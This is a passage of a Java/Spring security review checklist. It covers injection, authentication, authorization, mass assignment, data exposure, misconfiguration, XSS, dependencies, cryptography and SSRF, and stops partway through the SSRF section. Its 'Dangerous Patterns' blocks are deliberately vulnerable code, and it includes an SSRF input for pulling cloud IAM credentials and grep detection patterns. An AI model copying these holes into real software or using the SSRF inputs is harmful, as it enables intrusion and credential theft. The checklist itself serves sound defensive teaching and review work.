# Java Security Checklist

Language-specific security checklist organized by C1-C12 categories. Covers Spring Boot, Jakarta EE, and common Java web frameworks.

---

## C1: Injection

### Key Questions
- Are `Statement` objects used instead of `PreparedStatement`?
- Are MyBatis queries using `${}` (string substitution) instead of `#{}` (parameterized)?
- Is JNDI lookup performed on user-controlled input?
- Is XML parsing configured to prevent XXE?
- Is SpEL (Spring Expression Language) evaluated with user input?
- Is deserialization performed on untrusted data?

### Commonly Missed
- MyBatis `${}` vs `#{}`: `${}` does raw string interpolation, `#{}` is parameterized
- JNDI injection via `InitialContext.lookup(userInput)` (Log4Shell pattern)
- XXE via default `DocumentBuilderFactory` (external entities enabled by default)
- SpEL injection in Spring `@Value`, `@PreAuthorize`, or `ExpressionParser`
- JPA `createQuery` with concatenated HQL/JPQL
- `Runtime.getRuntime().exec()` with user input
- Hibernate `createSQLQuery` with string concatenation

### Dangerous Patterns

```java
// SQL injection via Statement
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE id = " + userId);

// SQL injection via string concatenation in JPA
String query = "SELECT u FROM User u WHERE u.name = '" + name + "'";
entityManager.createQuery(query);

// MyBatis string substitution (vulnerable)
// <select id="findUser">
//   SELECT * FROM users WHERE name = '${name}'
// </select>

// JNDI injection
InitialContext ctx = new InitialContext();
ctx.lookup(userControlledInput);  // Log4Shell-style attack

// XXE - default parser allows external entities
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(userInputStream);  // XXE possible

// SpEL injection
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);
Object result = exp.getValue();

// Command injection
Runtime.getRuntime().exec("ping " + userInput);
ProcessBuilder pb = new ProcessBuilder("sh", "-c", "ping " + userInput);

// Unsafe deserialization
ObjectInputStream ois = new ObjectInputStream(untrustedStream);
Object obj = ois.readObject();  // arbitrary code execution
```

### Safe Alternatives

```java
// PreparedStatement
PreparedStatement ps = connection.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);
ResultSet rs = ps.executeQuery();

// JPA parameterized query
TypedQuery<User> query = entityManager.createQuery(
    "SELECT u FROM User u WHERE u.name = :name", User.class);
query.setParameter("name", name);

// MyBatis parameterized (safe)
// <select id="findUser">
//   SELECT * FROM users WHERE name = #{name}
// </select>

// XXE prevention
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

// Safe subprocess (no shell)
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", userInput);
// Validate userInput is an IP/hostname before use

// Safe deserialization with allowlist
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.model.*;!*");
ois.setObjectInputFilter(filter);
```

### Grep Detection Patterns

```bash
# SQL injection
grep -rn "createStatement()" --include="*.java"
grep -rn "createQuery(.*+" --include="*.java" | grep -v "createQuery(\".*:.*\""
grep -rn 'executeQuery(.*".*+' --include="*.java"
grep -rn 'createNativeQuery(.*".*+' --include="*.java"

# MyBatis string substitution
grep -rn '\${' --include="*.xml" | grep -i "select\|insert\|update\|delete"

# JNDI injection
grep -rn "\.lookup(" --include="*.java"
grep -rn "InitialContext" --include="*.java"

# XXE
grep -rn "DocumentBuilderFactory\|SAXParserFactory\|XMLInputFactory" --include="*.java"
grep -rn "disallow-doctype-decl" --include="*.java"  # should exist if XML parsing is used

# SpEL injection
grep -rn "parseExpression(" --include="*.java"
grep -rn "SpelExpressionParser" --include="*.java"

# Command injection
grep -rn "Runtime\.getRuntime()\.exec(" --include="*.java"
grep -rn "ProcessBuilder(" --include="*.java"

# Unsafe deserialization
grep -rn "ObjectInputStream" --include="*.java"
grep -rn "readObject()" --include="*.java"
grep -rn "readUnshared()" --include="*.java"
```

---

## C2: Authentication

### Key Questions
- Is Spring Security configured correctly?
- Is JWT algorithm pinned and secret strong?
- Are session settings secure?
- Is CSRF protection enabled?
- Are password reset tokens single-use and time-limited?

### Commonly Missed
- `http.csrf().disable()` without justification
- `permitAll()` on sensitive endpoints
- JWT `setAllowedClockSkewSeconds` set too high
- Spring Security `@Order` misconfigurations allowing bypass
- `BCryptPasswordEncoder` with too-low strength (default 10 is acceptable, < 10 is not)
- Custom authentication filters not handling all error paths
- Session fixation: not calling `sessionManagement().sessionFixation().migrateSession()`

### Dangerous Patterns

```java
// CSRF disabled without justification
http.csrf().disable();

// Overly permissive security config
http.authorizeRequests()
    .antMatchers("/admin/**").permitAll()  // admin open to all
    .anyRequest().authenticated();

// JWT: not verifying algorithm
Claims claims = Jwts.parser()
    .setSigningKey(secret)
    .parseClaimsJws(token)
    .getBody();  // older jjwt versions may not enforce algorithm

// Weak password encoder
@Bean
public PasswordEncoder passwordEncoder() {
    return NoOpPasswordEncoder.getInstance();  // plaintext!
}

// Session fixation vulnerability
http.sessionManagement()
    .sessionFixation().none();  // should be migrateSession or newSession

// Permissive CORS in Spring
@CrossOrigin(origins = "*")
```

### Safe Alternatives

```java
// Spring Security proper configuration
@Override
protected void configure(HttpSecurity http) throws Exception {
    http
        .csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        .and()
        .authorizeRequests()
            .antMatchers("/admin/**").hasRole("ADMIN")
            .antMatchers("/api/**").authenticated()
            .antMatchers("/public/**").permitAll()
        .and()
        .sessionManagement()
            .sessionFixation().migrateSession()
            .maximumSessions(1)
        .and().and()
        .headers()
            .frameOptions().deny()
            .contentSecurityPolicy("default-src 'self'");
}

// BCrypt password encoder
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);
}

// JWT: pinned algorithm with jjwt 0.12+
Jws<Claims> jws = Jwts.parser()
    .verifyWith(secretKey)
    .build()
    .parseSignedClaims(token);

// Restrictive CORS
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://myapp.example.com"));
    config.setAllowedMethods(List.of("GET", "POST"));
    config.setAllowCredentials(true);
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}
```

### Grep Detection Patterns

```bash
# CSRF disabled
grep -rn "csrf()\.disable\|csrf\.disable" --include="*.java"

# Permissive access
grep -rn "permitAll()" --include="*.java"
grep -rn 'antMatchers.*admin.*permitAll\|requestMatchers.*admin.*permitAll' --include="*.java"

# Weak password encoder
grep -rn "NoOpPasswordEncoder\|PlaintextPasswordEncoder" --include="*.java"

# JWT config
grep -rn "setSigningKey\|verifyWith\|signWith" --include="*.java"

# CORS
grep -rn '@CrossOrigin(origins\s*=\s*"\*")' --include="*.java"
grep -rn "allowedOrigins.*\\*\|addAllowedOrigin.*\\*" --include="*.java"

# Session management
grep -rn "sessionFixation()\.none()" --include="*.java"
```

---

## C3: Authorization

### Key Questions
- Does every controller method have access control annotations?
- Are IDOR vulnerabilities present (resource lookup without ownership check)?
- Is method-level security enabled (`@EnableGlobalMethodSecurity`)?

### Commonly Missed
- Controller methods missing `@PreAuthorize` or `@Secured`
- IDOR: `repository.findById(id)` without checking ownership
- Spring Data REST exposing repository methods without access control
- Missing authorization on file download endpoints
- Transitive authorization: accessing child resources without checking parent ownership

### Dangerous Patterns

```java
// Missing access control
@GetMapping("/admin/users")
public List<User> listUsers() {
    return userRepository.findAll();  // no auth check
}

// IDOR
@GetMapping("/api/documents/{id}")
public Document getDocument(@PathVariable Long id) {
    return documentRepository.findById(id).orElseThrow();  // any user can access any document
}

// Spring Data REST exposing everything
@RepositoryRestResource
public interface UserRepository extends JpaRepository<User, Long> {
    // All CRUD operations exposed without auth
}
```

### Safe Alternatives

```java
// Method-level security
@PreAuthorize("hasRole('ADMIN')")
@GetMapping("/admin/users")
public List<User> listUsers() {
    return userRepository.findAll();
}

// Ownership check
@GetMapping("/api/documents/{id}")
public Document getDocument(@PathVariable Long id, @AuthenticationPrincipal UserDetails user) {
    Document doc = documentRepository.findById(id).orElseThrow();
    if (!doc.getOwnerId().equals(user.getId())) {
        throw new AccessDeniedException("Not authorized");
    }
    return doc;
}

// Spring Data REST: restrict exposed methods
@RepositoryRestResource
public interface UserRepository extends JpaRepository<User, Long> {
    @Override
    @PreAuthorize("hasRole('ADMIN')")
    void deleteById(Long id);
}
```

### Grep Detection Patterns

```bash
# Missing access control annotations
grep -rn "@GetMapping\|@PostMapping\|@PutMapping\|@DeleteMapping\|@RequestMapping" --include="*.java" -B 2 | grep -v "PreAuthorize\|Secured\|RolesAllowed"

# IDOR patterns
grep -rn "findById(.*@PathVariable\|findById(.*id)" --include="*.java" | grep -v "owner\|user\|auth"

# Spring Data REST
grep -rn "@RepositoryRestResource" --include="*.java"

# Missing method security
grep -rn "@EnableGlobalMethodSecurity\|@EnableMethodSecurity" --include="*.java"
```

---

## C4: Mass Assignment

### Key Questions
- Are request DTOs used instead of binding directly to entities?
- Is `@InitBinder` used to whitelist allowed fields for `@ModelAttribute`?
- Are `@JsonIgnoreProperties` or `@JsonIgnore` applied to prevent unauthorized field mutation?
- Are Spring Data REST repository endpoints reviewed for auto-exposed field mutation?
- Does `BeanUtils.copyProperties` or `ObjectMapper.updateValue` copy without field filtering?

### Commonly Missed
- `@ModelAttribute` binding without `@InitBinder` whitelist allows extra form fields to set entity properties
- `BeanUtils.copyProperties(dto, entity)` copies all matching fields including sensitive ones (role, isAdmin)
- Missing `@JsonIgnoreProperties` on entities allows Jackson to deserialize unexpected fields from request body
- JPA/Hibernate: directly persisting request DTOs without field filtering leads to unauthorized field updates
- Spring Data REST auto-exposed repository endpoints allowing field mutation on PATCH/PUT
- `ObjectMapper.updateValue(entity, requestMap)` merges all keys from request into entity without filtering
- `@RequestBody` bound to entity class instead of a dedicated DTO

### Dangerous Patterns

```java
// @ModelAttribute without @InitBinder whitelist
@PostMapping("/api/users")
public User createUser(@ModelAttribute User user) {
    return userRepository.save(user);  // attacker can set role, isAdmin, etc.
}

// BeanUtils.copyProperties without field filtering
@PutMapping("/api/users/{id}")
public User updateUser(@PathVariable Long id, @RequestBody Map<String, Object> updates) {
    User user = userRepository.findById(id).orElseThrow();
    BeanUtils.copyProperties(updates, user);  // copies all fields blindly
    return userRepository.save(user);
}

// @RequestBody binding to entity directly
@PutMapping("/api/users/{id}")
public User updateUser(@PathVariable Long id, @RequestBody User user) {
    return userRepository.save(user);  // attacker can set role, isAdmin, etc.
}

// ObjectMapper.updateValue merging all request fields
@PatchMapping("/api/users/{id}")
public User patchUser(@PathVariable Long id, @RequestBody Map<String, Object> requestMap) {
    User user = userRepository.findById(id).orElseThrow();
    objectMapper.updateValue(user, requestMap);  // merges all keys without filtering
    return userRepository.save(user);
}

// Missing @JsonIgnoreProperties on entity
@Entity
public class User {
    private String name;
    private String email;
    private String role;       // attacker can set via JSON
    private boolean isAdmin;   // attacker can set via JSON
}

// Spring Data REST auto-exposed mutation
@RepositoryRestResource
public interface UserRepository extends JpaRepository<User, Long> {
    // PATCH /users/{id} allows setting any field including role, isAdmin
}
```

### Safe Alternatives

```java
// Use a dedicated DTO with only allowed fields
public class UserUpdateRequest {
    private String name;
    private String email;
    // no role, no isAdmin
}

@PutMapping("/api/users/{id}")
public User updateUser(@PathVariable Long id, @RequestBody UserUpdateRequest request,
                        @AuthenticationPrincipal UserDetails currentUser) {
    User existing = userRepository.findById(id).orElseThrow();
    existing.setName(request.getName());
    existing.setEmail(request.getEmail());
    return userRepository.save(existing);
}

// @InitBinder whitelist for @ModelAttribute
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setAllowedFields("name", "email");  // only these fields can be bound
}

@PostMapping("/api/users")
public User createUser(@ModelAttribute User user) {
    return userRepository.save(user);
}

// @JsonIgnoreProperties on entity
@Entity
@JsonIgnoreProperties({"role", "isAdmin", "passwordHash"})
public class User {
    private String name;
    private String email;
    private String role;
    private boolean isAdmin;
    private String passwordHash;
}

// Spring Data REST: use @RepositoryRestResource with projections and event handlers
@RepositoryRestResource(excerptProjection = UserSummary.class)
public interface UserRepository extends JpaRepository<User, Long> {
    @Override
    @PreAuthorize("hasRole('ADMIN')")
    <S extends User> S save(S entity);
}
```

### Grep Detection Patterns

```bash
# @RequestBody binding to entity
grep -rn "@RequestBody.*Entity\|@RequestBody.*Model" --include="*.java"

# @ModelAttribute without @InitBinder
grep -rn "@ModelAttribute" --include="*.java"
grep -rn "@InitBinder" --include="*.java"  # should exist if @ModelAttribute is used

# BeanUtils.copyProperties
grep -rn "BeanUtils\.copyProperties" --include="*.java"

# ObjectMapper.updateValue
grep -rn "updateValue\|readerForUpdating" --include="*.java"

# Missing @JsonIgnoreProperties
grep -rn "@Entity" --include="*.java" -A 1 | grep -v "JsonIgnoreProperties"

# Spring Data REST
grep -rn "@RepositoryRestResource" --include="*.java"

# Direct entity persistence from request
grep -rn "repository\.save.*@RequestBody\|repository\.saveAndFlush.*@RequestBody" --include="*.java"
```

---

## C5: Data Exposure

### Key Questions
- Are passwords hashed with BCrypt/Argon2?
- Are secrets stored outside source code (not in `application.properties`)?
- Are sensitive fields excluded from API responses?
- Is TLS enforced?

### Commonly Missed
- Secrets in `application.properties` or `application.yml` committed to git
- `@ToString` (Lombok) on entities with sensitive fields
- Jackson serializing password hash fields to JSON
- Spring Actuator exposing `env` endpoint with secrets
- JDBC connection strings with embedded passwords

### Dangerous Patterns

```java
// Hardcoded credentials
String dbPassword = "supersecret";
String apiKey = "sk-live-abc123";

// application.properties with secrets
// spring.datasource.password=mysecret
// api.key=sk-live-abc123

// Entity exposing sensitive fields via Jackson
@Entity
public class User {
    private String passwordHash;  // will be serialized to JSON
    private String ssn;
    // getters/setters
}

// Lombok @ToString including sensitive fields
@ToString  // includes all fields
@Entity
public class User {
    private String passwordHash;
}

// JDBC URL with password
String url = "jdbc:mysql://localhost/db?user=root&password=secret";
```

### Safe Alternatives

```java
// Secrets from environment
@Value("${DB_PASSWORD}")
private String dbPassword;

// application.properties using env vars
// spring.datasource.password=${DB_PASSWORD}

// Jackson: exclude sensitive fields
@Entity
public class User {
    @JsonIgnore
    private String passwordHash;

    @JsonIgnore
    private String ssn;
}

// Or use a DTO
public class UserResponse {
    private Long id;
    private String username;
    private String email;
    // no password, no SSN
}

// Lombok: exclude sensitive fields
@ToString(exclude = {"passwordHash", "ssn"})
@Entity
public class User { ... }
```

### Grep Detection Patterns

```bash
# Hardcoded secrets
grep -rn "password\s*=\s*\"" --include="*.java"
grep -rn "apiKey\s*=\s*\"" --include="*.java"
grep -rn "secret\s*=\s*\"" --include="*.java"

# Properties files with secrets
grep -rn "password=" --include="*.properties" --include="*.yml" | grep -v "\${"

# Lombok @ToString without exclude
grep -rn "@ToString" --include="*.java" | grep -v "exclude"

# Missing @JsonIgnore on sensitive fields
grep -rn "passwordHash\|password_hash\|secretKey\|apiKey" --include="*.java" | grep -i "private.*String"

# JDBC URLs with credentials
grep -rn "jdbc:.*password=" --include="*.java" --include="*.properties" --include="*.yml"
```

---

## C6: Misconfiguration

### Key Questions
- Are Spring Actuator endpoints restricted?
- Is `server.error.include-stacktrace` set to `never`?
- Is debug mode disabled in production?
- Are default Spring Security endpoints configured?
- Is HTTPS enforced?

### Commonly Missed
- Actuator endpoints (`/actuator/env`, `/actuator/heapdump`) exposed without auth
- `server.error.include-stacktrace=always` leaking stack traces
- `server.error.include-message=always` leaking error details
- Default Spring Boot error page showing too much info
- H2 console enabled in production (`spring.h2.console.enabled=true`)
- Spring DevTools included in production build

### Dangerous Patterns

```properties
# application.properties - insecure settings
server.error.include-stacktrace=always
server.error.include-message=always
spring.h2.console.enabled=true
management.endpoints.web.exposure.include=*
spring.devtools.restart.enabled=true

# Debug logging in production
logging.level.org.springframework.security=DEBUG
logging.level.root=DEBUG
```

```java
// Actuator exposed without auth
@Override
protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
        .antMatchers("/actuator/**").permitAll();  // exposes env, heapdump, etc.
}

// CORS allowing all
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**").allowedOrigins("*");
    }
}
```

### Safe Alternatives

```properties
# application.properties - secure settings
server.error.include-stacktrace=never
server.error.include-message=never
server.error.include-binding-errors=never
spring.h2.console.enabled=false
management.endpoints.web.exposure.include=health,info
management.endpoint.health.show-details=never
server.servlet.session.cookie.secure=true
server.servlet.session.cookie.http-only=true
```

```java
// Actuator restricted
@Override
protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
        .antMatchers("/actuator/health").permitAll()
        .antMatchers("/actuator/**").hasRole("ADMIN");
}
```

### Grep Detection Patterns

```bash
# Actuator exposure
grep -rn "management.endpoints.web.exposure.include" --include="*.properties" --include="*.yml"
grep -rn "actuator.*permitAll" --include="*.java"

# Stack trace exposure
grep -rn "include-stacktrace\|include-message\|include-binding-errors" --include="*.properties" --include="*.yml"

# H2 console
grep -rn "h2.console.enabled" --include="*.properties" --include="*.yml"

# DevTools in production
grep -rn "spring-boot-devtools" --include="pom.xml" --include="build.gradle"

# Debug logging
grep -rn "logging.level.*DEBUG\|logging.level.*TRACE" --include="*.properties" --include="*.yml"

# CORS
grep -rn 'allowedOrigins("\*")\|addAllowedOrigin("\*")' --include="*.java"
```

---

## C7: XSS (Cross-Site Scripting)

### Key Questions
- Are JSP pages using `<%= %>` (unescaped) with user data?
- Is Thymeleaf `th:utext` used with user data?
- Is `@ResponseBody` returning unsanitized HTML?
- Are CSP headers configured?

### Commonly Missed
- JSP `<%= userInput %>` (unescaped) vs `<c:out value="${userInput}"/>` (escaped)
- Thymeleaf `th:utext` (unescaped) vs `th:text` (escaped)
- FreeMarker `${userInput}` may not auto-escape depending on config
- JSON responses reflected in HTML context without encoding
- REST API responses with `text/html` content type

### Dangerous Patterns

```jsp
<!-- JSP: unescaped output -->
<%= request.getParameter("name") %>
<p>${userInput}</p>  <!-- EL expression, may not escape depending on config -->

<!-- JSP: without JSTL escaping -->
<p>${comment.text}</p>
```

```html
<!-- Thymeleaf: unescaped output -->
<div th:utext="${userContent}"></div>

<!-- FreeMarker: potentially unescaped -->
<div>${userContent}</div>
```

```java
// Controller returning HTML with user data
@GetMapping("/search")
@ResponseBody
public String search(@RequestParam String q) {
    return "<h1>Results for: " + q + "</h1>";  // XSS
}
```

### Safe Alternatives

```jsp
<!-- JSP: use JSTL c:out for escaping -->
<c:out value="${userInput}" />

<!-- Or use fn:escapeXml -->
${fn:escapeXml(userInput)}
```

```html
<!-- Thymeleaf: use th:text (auto-escaped) -->
<div th:text="${userContent}"></div>
```

```java
// Return JSON instead of HTML
@GetMapping("/search")
@ResponseBody
public Map<String, String> search(@RequestParam String q) {
    return Map.of("query", q, "results", "...");
}

// CSP header via Spring Security
http.headers()
    .contentSecurityPolicy("default-src 'self'; script-src 'self'");
```

### Grep Detection Patterns

```bash
# JSP unescaped output
grep -rn "<%=" --include="*.jsp"
grep -rn '\${' --include="*.jsp" | grep -v "c:out\|fn:escapeXml"

# Thymeleaf unescaped
grep -rn "th:utext" --include="*.html"

# FreeMarker check auto-escape config
grep -rn "auto_escaping\|output_format" --include="*.properties" --include="*.yml" --include="*.java"

# Controller returning raw HTML
grep -rn "@ResponseBody" --include="*.java" -A 5 | grep "return.*\"<"

# CSP check
grep -rn "contentSecurityPolicy\|Content-Security-Policy" --include="*.java" --include="*.properties"
```

---

## C8: Dependencies

### Key Questions
- Has `mvn dependency:tree` or `gradle dependencies` been reviewed?
- Are there Log4j versions < 2.17.1?
- Are Spring Framework/Boot versions current?
- Are there known CVEs in transitive dependencies?

### Commonly Missed
- Log4j 2.x < 2.17.1 (CVE-2021-44228 Log4Shell and follow-ups)
- Spring Framework < 5.3.18 / 6.0.x (Spring4Shell CVE-2022-22965)
- Spring Boot Actuator info leaks
- Jackson-databind polymorphic deserialization CVEs
- Apache Commons collections deserialization gadgets
- Older Hibernate versions with HQL injection patches

### High-Risk Dependencies to Check

| Dependency | Risk | Check for |
|-----------|------|-----------|
| log4j-core | < 2.17.1: remote code execution | Log4Shell CVE-2021-44228 |
| spring-framework | < 5.3.18: RCE | Spring4Shell CVE-2022-22965 |
| spring-boot | Multiple CVEs per year | Version currency |
| jackson-databind | Polymorphic deserialization | Multiple CVEs |
| commons-collections | Deserialization gadgets | < 3.2.2 |
| snakeyaml | < 2.0: code execution | CVE-2022-1471 |
| h2 database | < 2.1.210: RCE | CVE-2021-42392 |
| apache-tomcat-embed | Multiple CVEs | Version currency |
| bcprov (Bouncy Castle) | Crypto vulnerabilities | Version currency |

### Grep Detection Patterns

```bash
# Check pom.xml for known vulnerable versions
grep -rn "log4j" pom.xml build.gradle
grep -rn "spring-boot-starter-parent" pom.xml | head -1
grep -rn "jackson-databind" pom.xml build.gradle
grep -rn "commons-collections" pom.xml build.gradle
grep -rn "snakeyaml" pom.xml build.gradle

# Run dependency audit
# mvn org.owasp:dependency-check-maven:check
# gradle dependencyCheckAnalyze

# Check for dependency management
grep -rn "<version>" pom.xml | grep -v "parent\|plugin"
```

---

## C9: Cryptography

### Key Questions
- Is `SecureRandom` used for token generation?
- Are passwords hashed with BCrypt/Argon2 (not MD5/SHA)?
- Is TLS 1.2+ enforced?
- Are encryption keys stored securely?
- Is ECB mode avoided?

### Commonly Missed
- `java.util.Random` used for security tokens (predictable)
- `MessageDigest.getInstance("MD5")` for password hashing
- `MessageDigest.getInstance("SHA-1")` for password hashing
- ECB mode: `Cipher.getInstance("AES/ECB/PKCS5Padding")`
- Hardcoded encryption keys and IVs
- Static salt for password hashing
- Disabled hostname verification

### Dangerous Patterns

```java
// Weak random
Random random = new Random();
String token = String.valueOf(random.nextLong());

// Weak password hashing
MessageDigest md = MessageDigest.getInstance("MD5");
byte[] hash = md.digest(password.getBytes());

MessageDigest md = MessageDigest.getInstance("SHA-256");
byte[] hash = md.digest(password.getBytes());  // no salt

// ECB mode
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");

// Hardcoded key
SecretKeySpec key = new SecretKeySpec("mysecretkey12345".getBytes(), "AES");

// Static IV
byte[] iv = "1234567890123456".getBytes();
IvParameterSpec ivSpec = new IvParameterSpec(iv);

// Disabled hostname verification
HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
conn.setHostnameVerifier((hostname, session) -> true);

// Disabled certificate validation
TrustManager[] trustAll = new TrustManager[] { new X509TrustManager() {
    public X509Certificate[] getAcceptedIssuers() { return null; }
    public void checkClientTrusted(X509Certificate[] certs, String type) {}
    public void checkServerTrusted(X509Certificate[] certs, String type) {}
}};
```

### Safe Alternatives

```java
// Secure random
SecureRandom secureRandom = new SecureRandom();
byte[] tokenBytes = new byte[32];
secureRandom.nextBytes(tokenBytes);
String token = Base64.getUrlEncoder().encodeToString(tokenBytes);

// BCrypt password hashing (Spring Security)
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hash = encoder.encode(password);
boolean matches = encoder.matches(password, hash);

// AES-GCM
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
byte[] iv = new byte[12];
new SecureRandom().nextBytes(iv);
GCMParameterSpec spec = new GCMParameterSpec(128, iv);
cipher.init(Cipher.ENCRYPT_MODE, key, spec);

// Key from secure storage
SecretKey key = KeyStore.getInstance("JCEKS")
    .getKey("mykey", keystorePassword.toCharArray());
```

### Grep Detection Patterns

```bash
# Weak random
grep -rn "new Random()" --include="*.java"
grep -rn "java\.util\.Random" --include="*.java"

# Weak hashing
grep -rn 'getInstance("MD5")\|getInstance("SHA-1")' --include="*.java"
grep -rn "MessageDigest" --include="*.java" | grep -i "password"

# ECB mode
grep -rn "AES/ECB" --include="*.java"
grep -rn 'getInstance("AES")' --include="*.java"  # defaults to ECB

# Hardcoded keys
grep -rn "SecretKeySpec(.*getBytes" --include="*.java"
grep -rn 'new IvParameterSpec("' --include="*.java"

# Disabled verification
grep -rn "setHostnameVerifier" --include="*.java"
grep -rn "TrustManager\|checkServerTrusted" --include="*.java"
grep -rn "ALLOW_ALL_HOSTNAME_VERIFIER" --include="*.java"
```

---

## C10: SSRF (Server-Side Request Forgery)

### Key Questions
- Are user-controlled URLs passed to HTTP clients without validation?
- Can internal services or cloud metadata endpoints be reached via user input?
- Are URL schemes restricted to `https` only where appropriate?
- Is DNS rebinding considered (validate after resolution, not just before)?
- Are redirect responses followed automatically to internal targets?

### Commonly Missed
- `new URL(userInput).openStream()` allows arbitrary requests including `file://` protocol
- `HttpURLConnection` with user-controlled URL follows redirects by default (can redirect to internal hosts)
- `HttpClient.newHttpClient().send()` with user-provided URI
- Apache HttpClient `HttpGet(userUrl)` without URL validation
- OkHttp `Request.Builder().url(userUrl)` without URL validation
- Spring `RestTemplate.getForObject(userUrl, ...)` and `WebClient.create(userUrl).get()`
- Cloud metadata endpoint `http://169.254.169.254/latest/meta-data/` reachable if URL is not validated
- XXE as SSRF vector: external entities in XML can trigger server-side requests (see C1, but note SSRF impact for data exfiltration and internal network scanning)
- DNS rebinding: URL passes validation at check time but resolves to internal IP at request time
- URL parsing inconsistencies between validator and HTTP client (e.g., `http://evil.com#@internal-host/`)

### Dangerous Patterns

```java
// Direct URL.openStream() with user input
@GetMapping("/fetch")
public byte[] fetchUrl(@RequestParam String url) throws Exception {
    return new URL(url).openStream().readAllBytes();  // SSRF: any URL, any protocol
}

// HttpURLConnection with user-controlled URL
@GetMapping("/proxy")
public String proxy(@RequestParam String target) throws Exception {
    HttpURLConnection conn = (HttpURLConnection) new URL(target).openConnection();
    conn.setInstanceFollowRedirects(true);  // follows redirects to internal hosts
    return new String(conn.getInputStream().readAllBytes());
}

// Java 11+ HttpClient with user-provided URI
HttpClient client = HttpClient.newHttpClient();
HttpRequest request = HttpRequest.newBuilder()
    .uri(URI.create(userProvidedUrl))  // SSRF if not validated
    .build();
HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

// Apache HttpClient
CloseableHttpClient httpClient = HttpClients.createDefault();
HttpGet httpGet = new HttpGet(userUrl);  // SSRF if userUrl not validated
CloseableHttpResponse response = httpClient.execute(httpGet);

// OkHttp
OkHttpClient client = new OkHttpClient();
Request request = new Request.Builder()
    .url(userUrl)  // SSRF if userUrl not validated
    .build();
Response response = client.newCall(request).execute();

// Spring RestTemplate with user-controlled URL
@GetMapping("/api/preview")
public String preview(@RequestParam String url) {
    return restTemplate.getForObject(url, String.class);  // SSRF
}

// Spring WebClient with user-controlled URL
@GetMapping("/api/fetch")
public Mono<String> fetch(@RequestParam String url) {
    return WebClient.create(url).get().retrieve().bodyToMono(String.class);  // SSRF
}

// Cloud metadata access
// Attacker supplies: http://169.254.169.254/latest/meta-data/iam/security-credentials/
// Server fetches IAM credentials from cloud metadata service
```

### Safe Alternatives

```java
// URL allowlist validation
private static final Set<String> ALLOWED_HOSTS = Set.of(
    "api.example.com", "cdn.example.com");

private void validateUrl(String url) {
    URI uri = URI.create(url);
    if (!"https".equals(uri.getScheme())) {
        throw new IllegalArgumentException("Only HTTPS allowed");
    }
    if (!ALLOWED_HOSTS.contains(uri.getHost())) {
        throw new IllegalArgumentException("Host not in allowlist");
    }
}

// IP-based validation (block internal ranges)
private boolean isInternalIp(String host) throws UnknownHostException {
    InetAddress addr = InetAddress.getByName(host);
    return addr.isLoopbackAddress()
        || addr.isLinkLocalAddress()
        || addr.isSiteLocalAddress()
        || addr.isAnyLocalAddress();
}

@GetMapping("/fetch")
public String safeFetch(@RequestParam String url) throws Exception {
    URI uri = URI.create(url);
    if (!"https".equals(uri.getScheme())) {
        throw new IllegalArgumentException("Only HTTPS allowed");
    }
    if (isInternalIp(uri.getHost())) {
        throw new IllegalArgumentException("Internal addresses not allowed");
    }
    // Resolve DNS and re-check IP to prevent DNS rebinding
    InetAddress resolved = InetAddress.getByName(uri.getHost());
    if (isInternalIp(resolved.getHostAddress())) {
        throw new IllegalArgumentException("Resolved to internal address");
    }
    // Use resolved IP for the actual connection
    HttpRequest request = HttpRequest.newBuilder()
        .uri(uri)
        .build();
    return HttpClient.newBuilder()
        .followRedirects(HttpClient.Redirect.NEVER)  // do not follow redirects
        .build()
        .send(request, HttpResponse.BodyHandlers.ofString())
        .body();
}

// Disable redirect following
HttpURLConnection conn = (HttpURLConnection) new URL(validatedUrl).openConnection();
conn.setInstanceFollowRedirects(false);  // prevent redirect to internal hosts

// Spring RestTemplate with interceptor for URL validation
restTemplate.setInterceptors(List.of((request, body, execution) -> {
    if (isInternalIp(request.getURI().getHost())) {
        throw new IllegalArgumentException("Internal addresses blocked");
    }
    return execution.execute(request, body);
}));
```

### Grep Detection Patterns

```bash
# URL.openStream() / openConnection()
grep -rn "\.openStream()\|\.openConnection()" --include="*.java"
grep -rn "new URL(" --include="*.java" | grep -v "getResource\|getClass\|classpath"

# Java HttpClient
grep -rn "HttpClient\.newHttpClient\|HttpClient\.newBuilder" --include="*.java"
grep -rn "HttpRequest\.newBuilder" --include="*.java"

# Apache HttpClient
grep -rn "HttpGet(\|HttpPost(\|HttpPut(\|HttpDelete(" --include="*.java"
grep -rn "HttpClients\.createDefault\|CloseableHttpClient" --include="*.java"

# OkHttp
grep -rn "OkHttpClient\|Request\.Builder()" --include="*.java"

# Spring RestTemplate / WebClient with dynamic URL
grep -rn "restTemplate\.\(getForObject\|postForObject\|exchange\)" --include="*.java"
grep -rn "WebClient\.create(" --include="*.java"

# Cloud metadata indicators
grep -rn "169\.254\.169\.254\|metadata\.google\|metadata\.azure" --include="*.java" --include="*.properties" --include="*.yml"

# Redirect following
